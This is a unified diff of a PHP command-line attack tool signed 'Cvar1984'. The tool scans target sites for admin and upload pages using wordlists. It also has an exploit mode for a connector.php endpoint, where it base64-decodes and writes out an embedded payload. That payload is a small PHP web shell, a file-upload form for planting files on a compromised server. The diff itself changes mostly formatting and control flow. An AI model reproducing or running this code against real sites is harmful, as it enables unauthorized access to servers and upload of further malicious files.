@@ -25,7 +25,7 @@ if(strtolower(substr(PHP_OS, 0, 3)) == 'win') {
 	$ua = "Mozilla/5.0 (Linux; Android 5.1.1; Andromax A16C3H Build/LMY47V) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.111 Mobile Safari/537.36";
 	system("clear");
 }
-function ngirim($url, $isi){
+function ngirim($url, $isi) {
  global $ua;
  $ch = curl_init($url);
  curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
@@ -65,14 +65,14 @@ if(!(isset($argv[1]) AND isset($argv[2]))) {
 	echo "--update,  -U\tUpdate Wordlist\n\n";
 	echo "Example : ".$GG."php ".$argv[0]." http://example.com --admin".$X."\n";
 } else {
-	if(preg_match("/^https:/", $argv[1])) {
-		$argv[1] = str_replace("https://", "http://", $argv[1]);
-	}
+	if(preg_match("/^https:/", $argv[1])):
+		$argv[1]=str_replace("https://", "http://", $argv[1]);
+		endif;
 	if($argv[2] == "--upload" OR $argv[2] == "-u") {
 		$list=explode("\n",file_get_contents("upload"));
 	} elseif($argv[2] == "--admin" OR $argv[2] == "-a") {
 		$list=explode("\n",file_get_contents("admin"));
-	} elseif($argv[2] == "--update" OR $argv[2] == "-U") {
+	} elseif($argv[2] == "--update" OR $argv[2] == "-U" OR $argv[1] == "--update" OR $argv[1] == "-U") {
 		echo $GG . "[*] Updating [*]" . $X . "\n\n";
 		if(!function_exists('file_get_contents')) {
 			die($RR . "Function Disabled" . $X . "\n");
@@ -118,6 +118,7 @@ if(!(isset($argv[1]) AND isset($argv[2]))) {
 			die($RR."php $argv[0] http://example.com/path/php/connector.php -e".$X."\n");
 		}
 		$isi="PD9waHAgCmlmKCRfUE9TVCl7CmlmKEBjb3B5KCRfRklMRVNbImYiXVsidG1wX25hbWUiXSwkX0ZJTEVTWyJmIl1bIm5hbWUiXSkpewplY2hvIjxiPmJlcmhhc2lsPC9iPi0tPiIuJF9GSUxFU1siZiJdWyJuYW1lIl07Cn1lbHNlewplY2hvIjxiPmdhZ2FsIjsKfQp9CmVsc2V7CgllY2hvICI8Zm9ybSBtZXRob2Q9cG9zdCBlbmN0eXBlPW11bHRpcGFydC9mb3JtLWRhdGE+PGlucHV0IHR5cGU9ZmlsZSBuYW1lPWY+PGlucHV0IG5hbWU9diB0eXBlPXN1Ym1pdCBpZD12IHZhbHVlPXVwPjxicj4iOwp9Cgo/Pg==";
+		$encode=base64_encode($isi);
 		$isi=base64_decode($isi);
 		$fp=fopen("x.php","w+");
 		fputs($fp, $isi);
@@ -158,8 +159,7 @@ if(!(isset($argv[1]) AND isset($argv[2]))) {
 		$result=str_replace('\x20'," ",$result);
 		$result=str_replace('\n',"\n",$result);
 		$result=str_replace('\r',"\r",$result);
-		echo $result;
-		die();
+		die($result);
 	} else {
 		die($YY . "[!] Parameter False [!]" . $X . "\n");
 	}
@@ -189,5 +189,5 @@ Url    : ".$url;
 		echo "Header : ".$header."\n";
 		echo "Url    : ".$Y.$url.$G."\n";
 	}
-	echo $R."=========================== Cvar1984 ))=====(@)>".$X."\n";
+	die($R."=========================== Cvar1984 ))=====(@)>".$X."\n");
 }
